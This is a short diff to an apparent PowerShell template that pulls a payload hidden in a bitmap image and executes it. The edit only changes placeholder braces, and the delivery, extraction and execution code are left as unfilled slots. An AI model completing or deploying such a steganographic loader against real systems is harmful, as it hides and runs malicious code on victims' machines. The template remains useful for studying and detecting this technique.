@@ -1,14 +1,14 @@
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
 
-[string] $payload_source = "{{ PAYLOAD_SOURCE }}"
-[Int32] $length = {{ MAX_BITS }}
+[string] $payload_source = "{{{ PAYLOAD_SOURCE }}}"
+[Int32] $length = {{{ MAX_BITS }}}
 
-{{ ALGORITHM_CODE }}
+{{{ ALGORITHM_CODE }}}
 
-$BitMap = {{ PAYLOAD_DELIVERY_CODE }}
+$BitMap = {{{ PAYLOAD_DELIVERY_CODE }}}
 
 $payload_data = get_payload $BitMap $length
 
-{{ PAYLOAD_EXEC_CODE }}
+{{{ PAYLOAD_EXEC_CODE }}}
 
 Start-Sleep -s 3
